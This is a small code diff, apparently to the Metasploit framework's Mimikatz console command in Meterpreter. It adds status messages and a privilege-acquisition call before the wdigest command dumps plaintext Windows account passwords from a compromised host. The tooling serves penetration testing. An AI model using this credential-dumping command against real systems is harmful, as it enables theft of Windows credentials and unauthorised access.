@@ -35,6 +35,9 @@ class Console::CommandDispatcher::Mimikatz
 
 	def cmd_wdigest(*args)
 		system_privilege_check
+		print_status("Getting privileges")
+		client.sys.config.getprivs
+		print_status("Retrieving passwords")
 		accounts = client.mimikatz.wdigest
 		
 		table = Rex::Ui::Text::Table.new(
